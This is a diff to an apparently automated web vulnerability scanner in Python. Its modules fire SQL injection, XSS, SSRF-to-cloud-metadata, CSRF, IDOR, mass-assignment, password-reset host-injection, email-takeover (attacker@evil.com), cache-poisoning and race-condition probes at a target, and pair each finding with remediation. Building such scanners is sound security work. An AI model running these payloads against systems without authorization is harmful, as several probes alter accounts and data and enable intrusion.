-                            test_name=f"sqli_time_based_{param}",
-                            severity="critical",
-                            title=f"Time-Based Blind SQL Injection in '{param}' Parameter",
-                            description=f"The parameter '{param}' appears vulnerable to time-based blind SQL injection. Response delayed by {elapsed:.1f}s.",
-                            evidence=f"GET {test_url}\nBaseline: {baseline_time:.2f}s | With payload: {elapsed:.2f}s",
-                            url=test_url,
-                            is_vulnerable=True,
-                            remediation="Use parameterized queries / prepared statements. Never interpolate user input into SQL.",
-                        )
-                        break  # One finding per param
-                except httpx.TimeoutException:
-                    # Timeout itself can indicate time-based injection
-                    yield _finding(
-                        module="sqli",
-                        test_name=f"sqli_time_based_timeout_{param}",
-                        severity="critical",
-                        title=f"Possible Time-Based Blind SQL Injection in '{param}' (Request Timed Out)",
-                        description=f"Request with SQL sleep payload timed out for parameter '{param}', suggesting time-based injection.",
-                        evidence=f"GET {test_url}\nRequest timed out",
-                        url=test_url,
-                        is_vulnerable=True,
-                        remediation="Use parameterized queries / prepared statements. Never interpolate user input into SQL.",
-                    )
-                    break
-                except (httpx.ConnectError, httpx.RequestError):
-                    continue
+        csrf_inputs = [i for i in inputs if "csrf" in i.lower() or "token" in i.lower()
+                       or "nonce" in i.lower()]
+        if not csrf_inputs:
+            yield _finding("csrf", "missing_csrf_token", "medium",
+                f"No CSRF Token in POST Form",
+                f"Form at {action} uses POST without a CSRF token field. "
+                f"Inputs found: {inputs}",
+                f"Form action: {action}\nMethod: POST\nInputs: {inputs}",
+                action, True,
+                "Add a CSRF token to all state-changing forms. Validate server-side.",
+                confidence="medium")
 
-        # Error-based
-        for payload in error_payloads:
+    # Test sensitive endpoints for CSRF via content-type bypass
+    parsed = urlparse(target)
+    for path in CSRF_SENSITIVE_ACTIONS:
+        url = target + path
+        try:
+            # Send JSON body as text/plain — SameSite bypass technique
+            r = await client.post(url,
+                content='{"email":"attacker@evil.com"}',
+                headers={"Content-Type": "text/plain", "Origin": "https://evil.example.com"},
+                timeout=8)
+            if r.status_code not in (404, 405, 501):
+                yield _finding("csrf", "csrf_content_type_bypass", "medium",
+                    f"Potential CSRF via Content-Type Bypass on {path}",
+                    f"Endpoint {path} returned {r.status_code} with text/plain content-type. "
+                    f"May bypass CSRF protection relying on content-type validation.",
+                    f"Status: {r.status_code}, Content-Type: text/plain bypass",
+                    url, True,
+                    "Validate CSRF tokens regardless of Content-Type. "
+                    "Use SameSite=Strict cookies for session management.",
+                    confidence="low")
+                break
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+
+# ── Module: XSS ───────────────────────────────────────────────────────────────
+
+async def _module_xss(target: str, client: httpx.AsyncClient,
+                      forms: list[dict]) -> AsyncGenerator[dict, None]:
+    # Reflected XSS via URL params
+    payloads = XSS_PAYLOADS[:8]
+    hit_params = set()
+
+    for param in XSS_TEST_PARAMS[:8]:
+        for payload in payloads[:3]:
             test_url = f"{target}?{param}={payload}"
             try:
-                resp = await client.get(test_url)
-                body = resp.text
-                for pattern in error_patterns:
-                    if pattern.lower() in body.lower():
-                        yield _finding(
-                            module="sqli",
-                            test_name=f"sqli_error_based_{param}",
-                            severity="high",
-                            title=f"Error-Based SQL Injection in '{param}' Parameter",
-                            description=f"SQL error message detected in response for parameter '{param}'.",
-                            evidence=f"GET {test_url}\nPayload: {payload!r}\nError pattern: {pattern}\nResponse snippet: {body[:300]}",
-                            url=test_url,
-                            is_vulnerable=True,
-                            remediation="Use parameterized queries. Suppress verbose SQL error messages in production.",
-                        )
-                        break
-            except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
-                continue
+                r = await client.get(test_url, timeout=8)
+                ct = r.headers.get("content-type", "")
+                if "text/html" in ct:
+                    for sig in ["<script>alert", "onerror=alert", "onload=alert", "onfocus=alert"]:
+                        if sig in r.text and param not in hit_params:
+                            hit_params.add(param)
+                            yield _finding("xss", "reflected_xss", "high",
+                                f"Reflected XSS via '{param}' parameter",
+                                f"Payload `{payload}` is reflected unescaped in HTML response.",
+                                f"URL: {test_url}\nReflected payload: {payload[:80]}",
+                                test_url, True,
+                                "HTML-encode all user-supplied input before reflection. "
+                                "Implement a strict Content-Security-Policy.",
+                                confidence="high")
+                            break
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
 
-
-# ---------------------------------------------------------------------------
-# Module 5: SSRF
-# ---------------------------------------------------------------------------
-
-async def _module_ssrf(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
-    ssrf_params = [
-        "url", "endpoint", "redirect", "next", "path", "dest", "uri",
-        "target", "src", "href", "callback", "fetch", "load", "proxy",
-    ]
-    ssrf_urls = [
-        ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "iam"]),
-        ("http://metadata.google.internal/computeMetadata/v1/", ["computeMetadata", "project-id"]),
-        ("http://localhost:80/", []),
-        ("http://127.0.0.1:22/", ["ssh-", "OpenSSH"]),
-    ]
-
-    for param in ssrf_params:
-        for ssrf_url, indicators in ssrf_urls:
-            test_url = f"{target}?{param}={ssrf_url}"
-            try:
-                resp = await client.get(test_url, timeout=5)
-                body = resp.text
-
-                if indicators:
-                    for indicator in indicators:
-                        if indicator.lower() in body.lower():
-                            yield _finding(
-                                module="ssrf",
-                                test_name=f"ssrf_critical_{param}",
-                                severity="critical",
-                                title=f"Server-Side Request Forgery (SSRF) — Cloud Metadata Accessible via '{param}'",
-                                description=f"The server fetched internal URL '{ssrf_url}' and returned cloud metadata in the response.",
-                                evidence=f"GET {test_url}\nIndicator found: {indicator}\nResponse snippet: {body[:500]}",
-                                url=test_url,
-                                is_vulnerable=True,
-                                remediation="Validate and allowlist URLs before making server-side requests. Block access to metadata endpoints.",
-                            )
-                            return  # Critical finding — stop
-            except httpx.ConnectError as exc:
-                err_str = str(exc).lower()
-                if "connection refused" in err_str or "connection reset" in err_str:
-                    yield _finding(
-                        module="ssrf",
-                        test_name=f"ssrf_potential_{param}",
-                        severity="medium",
-                        title=f"Potential SSRF — Server Attempted Internal Connection via '{param}'",
-                        description=f"Connection refused/reset response suggests the server attempted to connect to '{ssrf_url}', indicating SSRF potential.",
-                        evidence=f"GET {test_url}\nError: {str(exc)[:200]}",
-                        url=test_url,
-                        is_vulnerable=True,
-                        remediation="Validate and allowlist URLs before making server-side requests.",
-                    )
-            except (httpx.TimeoutException, httpx.RequestError):
-                continue
-
-
-# ---------------------------------------------------------------------------
-# Module 6: GraphQL
-# ---------------------------------------------------------------------------
-
-async def _module_graphql(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
-    parsed = urlparse(target)
-    base = f"{parsed.scheme}://{parsed.netloc}"
-
-    gql_paths = ["/graphql", "/api/graphql", "/gql", "/query"]
-    introspection_query = {"query": "{__schema{types{name}}}"}
-    batch_query = [{"query": "{__typename}"}, {"query": "{__typename}"}]
-
-    for path in gql_paths:
-        endpoint = base + path
-        # Introspection
-        try:
-            resp = await client.post(
-                endpoint,
-                json=introspection_query,
-                headers={"Content-Type": "application/json"},
-            )
-            if resp.status_code == 200:
-                try:
-                    data = resp.json()
-                    if "__schema" in str(data) and "types" in str(data):
-                        yield _finding(
-                            module="graphql",
-                            test_name="graphql_introspection",
-                            severity="high",
-                            title=f"GraphQL Introspection Enabled at {path}",
-                            description="GraphQL introspection is enabled, exposing the full API schema to attackers.",
-                            evidence=f"POST {endpoint}\nResponse snippet: {str(data)[:400]}",
-                            url=endpoint,
-                            is_vulnerable=True,
-                            remediation="Disable GraphQL introspection in production environments.",
-                        )
-
-                        # Batch query check
-                        try:
-                            bresp = await client.post(
-                                endpoint,
-                                json=batch_query,
-                                headers={"Content-Type": "application/json"},
-                            )
-                            if bresp.status_code == 200:
-                                bdata = bresp.json()
-                                if isinstance(bdata, list) and len(bdata) == 2:
-                                    yield _finding(
-                                        module="graphql",
-                                        test_name="graphql_batch_queries",
-                                        severity="medium",
-                                        title=f"GraphQL Batch Queries Enabled at {path}",
-                                        description="GraphQL batch queries are enabled, which can be abused for DoS or amplification attacks.",
-                                        evidence=f"POST {endpoint}\nBatch response: {str(bdata)[:200]}",
-                                        url=endpoint,
-                                        is_vulnerable=True,
-                                        remediation="Disable or limit GraphQL query batching. Implement query depth and complexity limits.",
-                                    )
-                        except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
-                            pass
-
-                        return  # Found a GraphQL endpoint — stop searching
-                except (ValueError, KeyError):
-                    pass
-        except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
+    # Stored XSS via forms
+    for form in forms[:6]:
+        method = form.get("method", "GET")
+        action = form.get("action", target)
+        inputs = form.get("inputs", [])
+        if method != "POST" or not inputs:
             continue
 
+        # Inject XSS into all text fields
+        payload = '<img src=x onerror=alert("xss_test_at_' + str(int(time.time()))[-4:] + '")>'
+        form_data = {inp: payload if not any(kw in inp.lower()
+                                              for kw in ["password", "token", "csrf", "hidden"])
+                     else "testvalue" for inp in inputs}
+        try:
+            r = await client.post(action, data=form_data, timeout=10)
+            if "xss_test_at_" in r.text and any(
+                sig in r.text for sig in ["onerror=alert", "src=x"]
+            ):
+                yield _finding("xss", "stored_xss", "critical",
+                    f"Stored XSS via Form at {action}",
+                    f"XSS payload persisted and reflected in response after POST.",
+                    f"Form: {action}\nPayload: {payload[:80]}",
+                    action, True,
+                    "HTML-encode output from database. Validate and sanitise all user input.",
+                    confidence="high")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
 
-# ---------------------------------------------------------------------------
-# Module 7: JWT
-# ---------------------------------------------------------------------------
+    # DOM XSS indicators
+    try:
+        r = await client.get(target, timeout=8)
+        dom_sinks = ["document.write(", "innerHTML =", "innerHTML=",
+                     "outerHTML =", "eval(", "setTimeout(", "location.href ="]
+        for sink in dom_sinks:
+            if sink in r.text:
+                yield _finding("xss", "dom_xss_sink", "medium",
+                    f"DOM XSS Sink Detected: {sink.strip()}",
+                    f"JavaScript code uses dangerous DOM sink `{sink.strip()}` "
+                    f"that may process attacker-controlled input.",
+                    f"Sink found: {sink}\nURL: {target}",
+                    target, True,
+                    "Avoid dangerous DOM sinks. Use textContent instead of innerHTML. "
+                    "Sanitise before writing to DOM.",
+                    confidence="low")
+                break
+    except httpx.HTTPError:
+        pass
 
-def _b64url_decode(s: str) -> bytes:
-    s += "=" * (-len(s) % 4)
-    return base64.urlsafe_b64decode(s)
+
+# ── Module: SQLi ──────────────────────────────────────────────────────────────
+
+async def _module_sqli(target: str, client: httpx.AsyncClient,
+                       forms: list[dict]) -> AsyncGenerator[dict, None]:
+    # Baseline timing
+    try:
+        t0 = time.monotonic()
+        await client.get(target, timeout=8)
+        baseline = time.monotonic() - t0
+    except Exception:
+        baseline = 0.5
+
+    # Test URL parameters
+    for param in SQLI_TEST_PARAMS[:5]:
+        # Error-based
+        for quote in ["'", '"']:
+            try:
+                r = await client.get(f"{target}?{param}={quote}", timeout=8)
+                bl = r.text.lower()
+                if any(pat in bl for pat in SQLI_ERROR_PATTERNS):
+                    yield _finding("sqli", "error_sqli_url", "high",
+                        f"SQL Error Disclosure via '{param}' URL parameter",
+                        f"SQL error string detected when injecting `{quote}` into `{param}`.",
+                        f"URL: {target}?{param}={quote}\nSnippet: {r.text[:300]}",
+                        target, True,
+                        "Use parameterized queries. Never display DB errors to users.",
+                        confidence="high")
+                    return
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+        # Time-based (one payload, with delay check)
+        if baseline < 1.5:
+            payload = SQLI_TIME_PAYLOADS[0]
+            try:
+                t0 = time.monotonic()
+                await client.get(f"{target}?{param}={payload}", timeout=10)
+                elapsed = time.monotonic() - t0
+                if elapsed >= 3.5 and elapsed > baseline * 3:
+                    yield _finding("sqli", "time_sqli_url", "critical",
+                        f"Time-Based Blind SQL Injection via '{param}'",
+                        f"Response delayed {elapsed:.1f}s with SLEEP payload. "
+                        f"Baseline was {baseline:.2f}s.",
+                        f"URL: {target}?{param}={payload}\nDelay: {elapsed:.2f}s",
+                        target, True,
+                        "Replace string concatenation with prepared statements. "
+                        "Audit all DB query construction.",
+                        confidence="high")
+                    return
+            except (httpx.TimeoutException, httpx.HTTPError):
+                pass
+            await asyncio.sleep(0)
+
+    # Test login forms
+    for form in forms[:3]:
+        if form.get("method") != "POST":
+            continue
+        inputs = form.get("inputs", [])
+        user_fields = [i for i in inputs if any(k in i.lower()
+                                                  for k in ["user", "email", "login", "name"])]
+        if not user_fields:
+            continue
+
+        sqli_payload = "admin'--"
+        form_data = {inp: sqli_payload if inp in user_fields else "test123"
+                     for inp in inputs}
+        try:
+            r = await client.post(form["action"], data=form_data, timeout=8)
+            bl = r.text.lower()
+            if any(pat in bl for pat in SQLI_ERROR_PATTERNS):
+                yield _finding("sqli", "error_sqli_login", "critical",
+                    "SQL Injection in Login Form",
+                    f"SQL error string in response to `admin'--` in login form.",
+                    f"Form: {form['action']}\nResponse: {r.text[:200]}",
+                    form["action"], True,
+                    "Use parameterized queries in authentication logic.",
+                    confidence="high")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
 
 
-def _b64url_encode(b: bytes) -> str:
-    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+# ── Module: SSRF ──────────────────────────────────────────────────────────────
+
+async def _module_ssrf(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    for param in SSRF_PARAMS[:10]:
+        for ssrf_url, indicators in SSRF_TARGETS[:4]:
+            test_url = f"{target}?{param}={ssrf_url}"
+            try:
+                r = await client.get(test_url, timeout=6)
+                body_lower = r.text.lower()
+                if any(ind.lower() in body_lower for ind in indicators):
+                    yield _finding("ssrf", "ssrf_cloud_metadata", "critical",
+                        f"SSRF to Cloud Metadata via '{param}'",
+                        f"Server fetched `{ssrf_url}` and reflected response containing "
+                        f"cloud metadata indicators.",
+                        f"Param: {param}\nSSRF URL: {ssrf_url}\nResponse: {r.text[:400]}",
+                        test_url, True,
+                        "Validate and allowlist all outbound URLs. Block 169.254.0.0/16 "
+                        "at network level. Implement IMDSv2 on AWS instances.",
+                        confidence="high")
+                    return
+            except httpx.ConnectError:
+                yield _finding("ssrf", "ssrf_potential", "medium",
+                    f"Potential SSRF — Internal Connection Attempted via '{param}'",
+                    f"Server attempted connecting to `{ssrf_url}` (connection refused). "
+                    f"Indicates server-side request was made.",
+                    f"Param: {param}, Target: {ssrf_url}", test_url, True,
+                    "Implement outbound URL allowlisting.",
+                    confidence="medium")
+                return
+            except (httpx.TimeoutException, httpx.HTTPError):
+                pass
+            await asyncio.sleep(0)
 
 
-async def _module_jwt(
-    target: str,
-    client: httpx.AsyncClient,
-    auth_headers: dict[str, str],
-) -> AsyncGenerator[AttackFinding, None]:
-    # Extract Bearer token
+# ── Module: IDOR ─────────────────────────────────────────────────────────────
+
+async def _module_idor(target: str, client: httpx.AsyncClient,
+                       client2: Optional[httpx.AsyncClient],
+                       endpoints: set[str],
+                       ids_found: list[str]) -> AsyncGenerator[dict, None]:
+    # Test endpoints with incremented/modified IDs
+    id_endpoints = []
+    for ep in endpoints:
+        for pat in IDOR_ENDPOINT_PATTERNS:
+            if re.search(pat, ep):
+                id_endpoints.append(ep)
+                break
+
+    for ep in id_endpoints[:10]:
+        # Try incrementing numeric IDs
+        modified = re.sub(r'/(\d+)(?=[/?]|$)', lambda m: f'/{int(m.group(1)) + 1}', ep)
+        if modified == ep:
+            continue
+        try:
+            r = await client.get(modified, timeout=8)
+            if r.status_code == 200 and len(r.text) > 50:
+                yield _finding("idor", "idor_id_increment", "high",
+                    f"Potential IDOR — Incremented ID Access",
+                    f"Accessing `{modified}` (incremented ID from `{ep}`) returned 200 with data. "
+                    f"May expose another user's data.",
+                    f"Original: {ep}\nModified: {modified}\nStatus: {r.status_code}\n"
+                    f"Response: {r.text[:300]}",
+                    modified, True,
+                    "Verify resource ownership server-side on every request. "
+                    "Use UUIDs instead of sequential IDs. Implement object-level authorization.",
+                    confidence="medium")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+    # Cross-account IDOR with Account 2
+    if client2 and ids_found:
+        for ep in id_endpoints[:5]:
+            # Try accessing Account 1's resource with Account 2's session
+            try:
+                r1 = await client.get(ep, timeout=8)
+                r2 = await client2.get(ep, timeout=8)
+                if r1.status_code == 200 and r2.status_code == 200:
+                    if len(r2.text) > 50 and r2.text[:200] == r1.text[:200]:
+                        yield _finding("idor", "idor_cross_account", "critical",
+                            f"IDOR — Cross-Account Data Access Confirmed",
+                            f"Account 2 can access Account 1's resource at `{ep}`. "
+                            f"Responses are identical — server not checking ownership.",
+                            f"Endpoint: {ep}\nBoth accounts returned identical data.",
+                            ep, True,
+                            "Implement object-level authorization checks tied to the "
+                            "authenticated user's identity, not just the object ID.",
+                            confidence="high")
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+    # Test common ID params in query string
+    for param in IDOR_ID_PARAMS[:8]:
+        for id_val in ["1", "2", "3", "0", "-1", "999999"]:
+            test_url = f"{target}/api?{param}={id_val}"
+            try:
+                r = await client.get(test_url, timeout=6)
+                if r.status_code == 200 and len(r.text) > 100:
+                    try:
+                        data = r.json()
+                        if isinstance(data, dict) and any(
+                            k in data for k in ["id", "email", "name", "user_id"]
+                        ):
+                            yield _finding("idor", "idor_param_access", "medium",
+                                f"Potential IDOR via '{param}' Query Parameter",
+                                f"Accessing {param}={id_val} returns user/object data.",
+                                f"URL: {test_url}\nData keys: {list(data.keys())[:10]}",
+                                test_url, True,
+                                "Verify ownership before returning object data.",
+                                confidence="medium")
+                            break
+                    except Exception:
+                        pass
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+
+# ── Module: Privilege Escalation ─────────────────────────────────────────────
+
+async def _module_privilege(target: str, client: httpx.AsyncClient,
+                             forms: list[dict]) -> AsyncGenerator[dict, None]:
+    # Admin path enumeration
+    found_admin = []
+    for path in PRIV_ESC_ADMIN_PATHS[:20]:
+        url = target + path
+        try:
+            r = await client.get(url, timeout=6)
+            if r.status_code == 200 and len(r.text) > 100:
+                found_admin.append(url)
+                yield _finding("privilege", "exposed_admin", "high",
+                    f"Unauthenticated Admin Path: {path}",
+                    f"Path {path} returns HTTP 200 without authentication.",
+                    f"URL: {url}\nStatus: {r.status_code}\nBody: {r.text[:200]}",
+                    url, True,
+                    f"Require authentication and admin role for {path}. "
+                    f"Add IP allowlisting for admin interfaces.",
+                    confidence="high")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+    # Mass assignment via API endpoints
+    api_endpoints = [f"{target}/api/user", f"{target}/api/me",
+                     f"{target}/api/profile", f"{target}/api/account"]
+    for url in api_endpoints:
+        for payload in PRIV_ESC_PARAMS[:5]:
+            try:
+                r = await client.patch(url, json=payload, timeout=8)
+                if r.status_code in (200, 201):
+                    try:
+                        data = r.json()
+                        injected_key = list(payload.keys())[0]
+                        if injected_key in data and str(data.get(injected_key)) == str(list(payload.values())[0]):
+                            yield _finding("privilege", "mass_assignment", "critical",
+                                f"Mass Assignment — '{injected_key}' Field Accepted",
+                                f"PATCH {url} accepted and applied `{injected_key}={list(payload.values())[0]}`. "
+                                f"Attacker can escalate privileges.",
+                                f"Payload: {json.dumps(payload)}\nResponse key: {data.get(injected_key)}",
+                                url, True,
+                                "Implement explicit allowlisting of writeable fields. "
+                                "Never bind request body directly to internal models.",
+                                confidence="high")
+                    except Exception:
+                        pass
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+
+# ── Module: Account Takeover ──────────────────────────────────────────────────
+
+async def _module_account_takeover(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    # Host header injection in password reset
+    for path in ATO_RESET_ENDPOINTS:
+        url = target + path
+        for header_set in ATO_PASSWORD_RESET_TESTS[:2]:
+            try:
+                r = await client.post(url, json={"email": "test@test.com"},
+                                      headers=header_set, timeout=8)
+                if r.status_code in (200, 201, 302):
+                    yield _finding("account", "password_reset_host_injection", "high",
+                        f"Password Reset Host Header Injection",
+                        f"Password reset endpoint at {path} accepted request with "
+                        f"injected {list(header_set.keys())[0]} header. "
+                        f"Reset link may be sent to attacker-controlled domain.",
+                        f"Header: {header_set}\nStatus: {r.status_code}",
+                        url, True,
+                        "Hardcode the application domain for password reset emails. "
+                        "Never use Host/X-Forwarded-Host headers to build reset URLs.",
+                        confidence="medium")
+                    break
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+    # Email change without re-authentication
+    for path in ATO_EMAIL_CHANGE_ENDPOINTS:
+        url = target + path
+        try:
+            r = await client.post(url, json={"email": "attacker@evil.com",
+                                              "new_email": "attacker@evil.com"},
+                                  timeout=8)
+            if r.status_code in (200, 201):
+                yield _finding("account", "email_change_no_auth", "high",
+                    f"Email Change Without Re-Authentication",
+                    f"Email change at {path} succeeded without password confirmation. "
+                    f"Attacker with stolen session can permanently take over account.",
+                    f"URL: {url}\nStatus: {r.status_code}",
+                    url, True,
+                    "Require current password confirmation for email changes. "
+                    "Send verification to both old and new email addresses.",
+                    confidence="medium")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+
+# ── Module: Cache Poisoning ───────────────────────────────────────────────────
+
+async def _module_cache(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    # Try each unkeyed header
+    for header in CACHE_POISON_HEADERS[:6]:
+        for value in CACHE_POISON_VALUES[:2]:
+            try:
+                r = await client.get(target, headers={header: value}, timeout=8)
+                body = r.text
+
+                # Check if injected value appears in response
+                if value in body:
+                    yield _finding("cache", f"cache_poison_{header.lower()}", "high",
+                        f"Cache Poisoning via {header}",
+                        f"Value from unkeyed header `{header}: {value}` was reflected in "
+                        f"the response body. If cached, this poisons the cache for all users.",
+                        f"Header: {header}: {value}\nReflected in body: yes\n"
+                        f"Cache headers: {r.headers.get('cache-control', 'none')}",
+                        target, True,
+                        f"Add {header} to your cache key, or strip unkeyed headers at CDN. "
+                        f"Validate Host header before using it in response generation.",
+                        confidence="high")
+                    return
+
+                # Check if cache hit happens with poisoned header
+                cache_status = r.headers.get("x-cache", "") or r.headers.get("cf-cache-status", "")
+                if "hit" in cache_status.lower() and r.status_code == 200:
+                    yield _finding("cache", "cache_hit_with_unkeyed_header", "medium",
+                        f"Cache Hit with Unkeyed Header Present",
+                        f"Cache served a HIT response even with `{header}` present. "
+                        f"Header may not be included in cache key.",
+                        f"Header: {header}: {value}\nCache-Status: {cache_status}",
+                        target, True,
+                        f"Include {header} in your cache key configuration.",
+                        confidence="medium")
+                    break
+
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+
+# ── Module: Race Conditions ───────────────────────────────────────────────────
+
+async def _module_race(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    # Find state-changing endpoints from known patterns
+    race_targets = []
+    for path in RACE_CONDITION_ENDPOINTS:
+        url = target + path
+        try:
+            r = await client.get(url, timeout=5)
+            if r.status_code not in (404, 405, 501):
+                race_targets.append(url)
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+    for url in race_targets[:3]:
+        # Send 10 parallel requests
+        async def _req():
+            try:
+                return await client.post(url, json={}, timeout=8)
+            except Exception:
+                return None
+
+        responses = await asyncio.gather(*[_req() for _ in range(8)])
+        ok_responses = [r for r in responses if r and r.status_code in (200, 201)]
+
+        if len(ok_responses) >= 2:
+            yield _finding("race", "race_condition_endpoint", "high",
+                f"Race Condition Vulnerability at {urlparse(url).path}",
+                f"Sent 8 parallel requests — {len(ok_responses)} succeeded (HTTP 200/201). "
+                f"This may enable double-spend, duplicate coupon redemption, or "
+                f"resource over-allocation.",
+                f"URL: {url}\nParallel successes: {len(ok_responses)}/8",
+                url, True,
+                "Use database-level locking or idempotency keys. "
+                "Implement atomic transactions for state-changing operations.",
+                confidence="medium")
+
+
+# ── Module: Business Logic ────────────────────────────────────────────────────
+
+async def _module_business(target: str, client: httpx.AsyncClient,
+                            forms: list[dict]) -> AsyncGenerator[dict, None]:
+    # Negative price / quantity test via API
+    api_cart = [f"{target}/api/cart", f"{target}/api/checkout",
+                f"{target}/api/order", f"{target}/cart", f"{target}/checkout"]
+
+    for url in api_cart:
+        for test in BUSINESS_LOGIC_TESTS[:4]:
+            try:
+                payload = {test["field"]: test["value"]}
+                r = await client.post(url, json=payload, timeout=8)
+                if r.status_code in (200, 201):
+                    try:
+                        data = r.json()
+                        if isinstance(data, dict):
+                            price = data.get("total") or data.get("price") or data.get("amount")
+                            if price is not None and float(price) <= 0:
+                                yield _finding("business", "negative_price", "critical",
+                                    f"Business Logic Flaw — Negative {test['field'].title()}",
+                                    f"Setting {test['field']}={test['value']} resulted in "
+                                    f"negative/zero total ({price}). Attacker may receive credits.",
+                                    f"URL: {url}\nPayload: {payload}\nTotal: {price}",
+                                    url, True,
+                                    f"Server-side validate {test['field']} is positive. "
+                                    f"Never trust client-supplied price/quantity.",
+                                    confidence="high")
+                    except Exception:
+                        pass
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+    # Price parameter in forms
+    for form in forms[:5]:
+        if "price" in form.get("inputs", []) or "amount" in form.get("inputs", []):
+            for field in ["price", "amount", "total"]:
+                if field in form["inputs"]:
+                    form_data = {inp: "0.01" if inp == field else "test"
+                                 for inp in form["inputs"]}
+                    try:
+                        r = await client.post(form["action"], data=form_data, timeout=8)
+                        if r.status_code in (200, 201, 302):
+                            yield _finding("business", "price_tampering_form", "high",
+                                f"Price Parameter Tampering in Form",
+                                f"Form at {form['action']} contains a `{field}` input. "
+                                f"Server may trust client-supplied price.",
+                                f"Form: {form['action']}\nField: {field}=0.01\n"
+                                f"Status: {r.status_code}",
+                                form["action"], True,
+                                "Never trust client-supplied price/quantity. "
+                                "Always calculate totals server-side from the product catalog.",
+                                confidence="medium")
+                    except httpx.HTTPError:
+                        pass
+
+
+# ── Module: GraphQL ───────────────────────────────────────────────────────────
+
+async def _module_graphql(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    for path in GRAPHQL_PATHS:
+        url = target + path
+        try:
+            r = await client.post(url, content=GRAPHQL_INTROSPECTION,
+                                  headers={"Content-Type": "application/json"}, timeout=8)
+            if r.status_code == 200:
+                try:
+                    data = r.json()
+                    if "__schema" in str(data) or "types" in str(data.get("data", {})):
+                        yield _finding("graphql", "introspection_enabled", "high",
+                            f"GraphQL Introspection Enabled at {path}",
+                            "Full schema is exposed via introspection. Attackers can enumerate "
+                            "all types, fields, queries, and mutations.",
+                            f"Endpoint: {url}\nTypes found: {str(data)[:300]}",
+                            url, True,
+                            "Disable introspection in production. Implement query depth limiting "
+                            "and query complexity analysis.",
+                            confidence="high")
+
+                    # Batch query abuse
+                    rb = await client.post(url, content=GRAPHQL_BATCH,
+                                           headers={"Content-Type": "application/json"}, timeout=8)
+                    if rb.status_code == 200 and isinstance(rb.json(), list) and len(rb.json()) > 1:
+                        yield _finding("graphql", "batch_queries", "medium",
+                            f"GraphQL Batch Queries Enabled",
+                            "Server accepts batched query arrays, enabling rate limit bypass "
+                            "and DoS amplification attacks.",
+                            f"Batch response: {rb.text[:200]}", url, True,
+                            "Disable query batching or limit batch size. "
+                            "Implement per-user rate limiting at the query level.",
+                            confidence="high")
+
+                    # Unauthenticated data access
+                    for query in GRAPHQL_AUTH_BYPASS_QUERIES:
+                        rq = await client.post(url, content=query,
+                                               headers={"Content-Type": "application/json"},
+                                               timeout=8)
+                        if rq.status_code == 200:
+                            qdata = rq.json().get("data", {})
+                            if qdata and not rq.json().get("errors"):
+                                yield _finding("graphql", "unauth_data_access", "critical",
+                                    "Unauthenticated GraphQL Data Access",
+                                    f"Query returned user data without authentication: {query[:80]}",
+                                    f"Response: {rq.text[:300]}", url, True,
+                                    "Implement authentication checks on all sensitive GraphQL resolvers.",
+                                    confidence="high")
+                                break
+                    return
+                except Exception:
+                    pass
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+
+# ── Module: JWT ───────────────────────────────────────────────────────────────
+
+def _b64d(s: str) -> bytes:
+    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
+
+
+async def _module_jwt(target: str, client: httpx.AsyncClient,
+                      auth_headers: dict[str, str]) -> AsyncGenerator[dict, None]:
     token = None
     for k, v in auth_headers.items():
         if k.lower() == "authorization" and v.lower().startswith("bearer "):
-            token = v[7:].strip()
+            token = v[7:]
             break
 
     if not token:
+        yield _finding("jwt", "no_jwt_provided", "info",
+            "No JWT Token Provided",
+            "Supply an Authorization: Bearer <token> header to enable JWT analysis.",
+            "", target, False, "Provide JWT in auth_headers for JWT module to run.",
+            confidence="high")
         return
 
     parts = token.split(".")
@@ -615,348 +1161,398 @@ async def _module_jwt(
         return
 
     try:
-        header_data = json.loads(_b64url_decode(parts[0]))
-        payload_data = json.loads(_b64url_decode(parts[1]))
+        header_data = json.loads(_b64d(parts[0]))
+        payload_data = json.loads(_b64d(parts[1]))
     except Exception:
         return
 
-    # Info — claims exposure
-    interesting_claims = {k: v for k, v in payload_data.items() if k in ("sub", "email", "role", "exp", "iat", "iss")}
-    if interesting_claims:
-        yield _finding(
-            module="jwt",
-            test_name="jwt_claims_info",
-            severity="info",
-            title="JWT Claims Exposed",
-            description=f"The JWT payload contains the following claims: {list(interesting_claims.keys())}. JWT payloads are base64-encoded, not encrypted.",
-            evidence=f"Header: {json.dumps(header_data)}\nPayload claims: {json.dumps(interesting_claims)}",
-            url=target,
-            is_vulnerable=False,
-            remediation="Do not store sensitive data in JWT payloads. Use opaque tokens for sensitive sessions.",
-        )
+    # Info: report claims
+    sensitive = {k: v for k, v in payload_data.items()
+                 if k in ("sub", "email", "role", "admin", "is_admin",
+                           "scope", "permissions", "iat", "exp")}
+    yield _finding("jwt", "jwt_claims_info", "info",
